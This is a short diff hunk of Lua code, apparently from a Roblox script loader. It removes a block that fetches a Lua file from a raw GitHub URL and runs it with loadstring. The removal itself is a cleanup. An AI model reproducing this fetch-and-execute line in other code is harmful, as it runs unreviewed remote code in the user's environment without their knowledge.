@@ -48,6 +48,4 @@ if url then
 else
 	loadScript(UNIVERSAL)
 end
-task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/chienminh21/aaaaaaaa/refs/heads/main/huhucheck.lua"))()
-end)
+
